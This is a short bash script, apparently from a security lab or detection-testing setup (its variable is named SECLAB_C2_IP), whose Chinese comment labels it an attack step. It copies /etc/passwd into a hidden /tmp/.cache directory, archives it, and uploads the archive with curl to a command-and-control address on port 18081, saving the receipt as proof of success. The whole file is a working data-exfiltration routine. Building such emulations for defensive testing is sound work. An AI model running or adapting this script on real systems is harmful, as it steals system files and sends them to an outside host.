#!/usr/bin/env bash
# attack（窗口内）：敏感记录打包并 POST 上传外部存储（接收端回执为成功物证）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
mkdir -p /tmp/.cache/exfil/sensitive
cp /etc/passwd /tmp/.cache/exfil/sensitive/records.csv 2>/dev/null || echo "records" > /tmp/.cache/exfil/sensitive/records.csv
tar czf /tmp/.cache/exfil/exfil.tar.gz -C /tmp/.cache/exfil sensitive
curl -s --max-time 10 -F "f=@/tmp/.cache/exfil/exfil.tar.gz" "http://$C2_IP:18081/exfil" > /tmp/.cache/exfil/upload-receipt.txt
